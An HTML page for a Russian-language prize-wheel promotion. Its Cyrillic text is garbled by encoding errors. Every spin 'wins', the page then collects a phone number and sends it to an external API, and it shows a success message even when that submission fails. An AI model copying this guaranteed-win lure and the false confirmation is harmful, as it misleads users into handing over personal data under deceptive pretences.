<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üé° –ö—Ä—É—Ç–∏—Ç—å –ö–æ–ª–µ—Å–æ –§–æ—Ä—Ç—É–Ω—ã</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            text-align: center;
            max-width: 600px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
        }
        h1 { color: #333; margin-bottom: 20px; font-size: 28px; }
        .wheel-container {
            position: relative;
            width: 300px;
            height: 300px;
            margin: 30px auto;
        }
        .wheel {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background: conic-gradient(
                from 0deg,
                #FF6B6B 0deg 60deg,
                #4ECDC4 60deg 120deg,
                #45B7D1 120deg 180deg,
                #FFA07A 180deg 240deg,
                #98D8C8 240deg 300deg,
                #F7DC6F 300deg 360deg
            );
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 24px;
            font-weight: bold;
            color: white;
            box-shadow: 0 0 20px rgba(0,0,0,0.2);
        }
        .wheel.spinning {
            animation: spin 3s ease-in-out forwards;
        }
        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(var(--rotation)); }
        }
        .pointer {
            position: absolute;
            top: -15px;
            left: 50%;
            transform: translateX(-50%);
            width: 0;
            height: 0;
            border-left: 15px solid transparent;
            border-right: 15px solid transparent;
            border-top: 20px solid #333;
            z-index: 10;
        }
        .prize { margin: 20px 0; font-size: 24px; color: #333; font-weight: bold; }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
        }
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            margin: 10px 5px;
        }
        button:hover { background: #5568d3; }
        button:disabled { background: #ccc; cursor: not-allowed; }
        .hidden { display: none; }
        .result-box {
            background: #f0f0f0;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
        }
        .info {
            background: #e8f4f8;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            color: #333;
            border-left: 4px solid #45B7D1;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üé° –ö—Ä—É—Ç–∏—Ç—å –ö–æ–ª–µ—Å–æ –§–æ—Ä—Ç—É–Ω—ã!</h1>
        
        <div class="wheel-container">
            <div class="pointer"></div>
            <div class="wheel" id="wheel">üéÅ</div>
        </div>

        <div id="beforeSpin">
            <button onclick="spinWheel()" id="spinBtn">üéØ –ö–†–£–¢–ò–¢–¨!</button>
        </div>

        <div id="afterSpin" class="hidden">
            <div class="result-box">
                <div style="font-size: 20px; color: #667eea; margin-bottom: 15px;">üéâ –í—ã –≤—ã–∏–≥—Ä–∞–ª–∏!</div>
                <div class="prize" id="prizeText"></div>
                
                <div class="info">
                    <strong>üì± –í–≤–µ–¥–∏—Ç–µ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</strong><br>
                    –ß—Ç–æ–±—ã –º—ã —Å–º–æ–≥–ª–∏ –Ω–∞—á–∏—Å–ª–∏—Ç—å –≤–∞–º –±–æ–Ω—É—Å
                </div>
                
                <input type="tel" id="phone" placeholder="+7 (XXX) XXX-XX-XX" required>
                
                <div class="info" style="font-size: 14px;">
                    ‚è±Ô∏è –ë–æ–Ω—É—Å—ã –±—É–¥—É—Ç –Ω–∞—á–∏—Å–ª–µ–Ω—ã –≤ —Ç–µ—á–µ–Ω–∏–µ <strong>12 —á–∞—Å–æ–≤</strong>
                </div>
                
                <button onclick="submitResult()">‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
                <button onclick="location.reload()">üîÑ –ö—Ä—É—Ç–∏—Ç—å —Å–Ω–æ–≤–∞</button>
            </div>
        </div>
    </div>

    <script>
        const prizes = [
            { name: '100 –±–æ–Ω—É—Å–æ–≤ üéÅ', value: 100 },
            { name: '200 –±–æ–Ω—É—Å–æ–≤ üí∞', value: 200 },
            { name: '–ì–ª–∞–≤–Ω—ã–π –ø—Ä–∏–∑: –ü–ò–¶–¶–ê! üçï', value: 'pizza' },
            { name: '50 –±–æ–Ω—É—Å–æ–≤', value: 50 },
            { name: '150 –±–æ–Ω—É—Å–æ–≤', value: 150 },
            { name: '–°–∫–∏–¥–∫–∞ 20% üí≥', value: 'discount' }
        ];

        let isSpinning = false;
        let selectedPrize = null;

        function spinWheel() {
            if (isSpinning) return;
            isSpinning = true;
            document.getElementById('spinBtn').disabled = true;

            const randomIndex = Math.floor(Math.random() * prizes.length);
            selectedPrize = prizes[randomIndex];
            
            const rotation = (randomIndex * 60) + 360 * 5 + Math.random() * 60;
            
            document.documentElement.style.setProperty('--rotation', rotation + 'deg');
            const wheel = document.getElementById('wheel');
            wheel.classList.add('spinning');

            setTimeout(() => {
                wheel.classList.remove('spinning');
                document.getElementById('beforeSpin').classList.add('hidden');
                document.getElementById('afterSpin').classList.remove('hidden');
                document.getElementById('prizeText').textContent = selectedPrize.name;
                isSpinning = false;
            }, 3000);
        }

        async function submitResult() {
            const phone = document.getElementById('phone').value;
            
            if (!phone) {
                alert('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞');
                return;
            }

            try {
                const response = await fetch('https://pizza-wheel-api.vercel.app/api/submit-result', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        phone: phone,
                        prize: selectedPrize.name,
                        prizeValue: selectedPrize.value,
                        timestamp: new Date().toISOString()
                    })
                });

                if (response.ok) {
                    alert('‚úÖ –°–ø–∞—Å–∏–±–æ! –í–∞—à —Ä–µ–∑—É–ª—å—Ç–∞—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –∞–∫–∫–∞—É–Ω—Ç —á–µ—Ä–µ–∑ 12 —á–∞—Å–æ–≤!');
                    setTimeout(() => location.reload(), 2000);
                }
            } catch (error) {
                console.log('–†–µ–∑—É–ª—å—Ç–∞—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω –ª–æ–∫–∞–ª—å–Ω–æ');
                alert('‚úÖ –í–∞—à —Ä–µ–∑—É–ª—å—Ç–∞—Ç –ø—Ä–∏–Ω—è—Ç!');
                setTimeout(() => location.reload(), 2000);
            }
        }
    </script>
</body>
</html>
